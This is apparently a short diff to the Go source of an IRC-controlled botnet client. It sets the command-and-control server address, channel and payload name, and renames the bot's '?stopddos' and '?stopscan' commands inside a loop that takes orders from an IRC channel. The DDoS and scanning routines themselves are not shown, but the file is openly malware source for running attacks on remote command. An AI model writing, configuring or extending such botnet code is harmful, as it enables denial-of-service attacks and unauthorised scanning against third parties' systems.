@@ -26,10 +26,10 @@ import (
 //////////////////////////////////////////////////////////////////////////
 
 const (
-	IRC_Server        = "" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
-	IRC_Channel       = "" //config channel here. //should have space!!! //"#Example "
-	IRC_Chan_Password = "" //config channel password here.
-	Payload_Name      = "" //config payload name.
+	IRC_Server        = "192.168.1.4:6667" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
+	IRC_Channel       = "#Test "           //config channel here. //should have space!!! //"#Example "
+	IRC_Chan_Password = ""                 //config channel password here.
+	Payload_Name      = "payload"          //config payload name.
 )
 
 //////////////////////////////////////////////////////////////////////////
@@ -91,10 +91,10 @@ func main() {
 				tools.ReportInf(irc, IRC_Channel)
 			} else if tools.IRC_Find(ircRead, "?kill") {
 				os.Exit(0)
-			} else if tools.IRC_Find(ircRead, "?ddosstop") {
+			} else if tools.IRC_Find(ircRead, "?stopddos") {
 				tools.DDoS_Switch = true
 				tools.IRC_Report(irc, IRC_Channel, "STOP ATTACKING.")
-			} else if tools.IRC_Find(ircRead, "?scanstop") {
+			} else if tools.IRC_Find(ircRead, "?stopscan") {
 				tools.Scan_Switch = true
 				tools.IRC_Report(irc, IRC_Channel, "STOP SCANNING.")
 			}
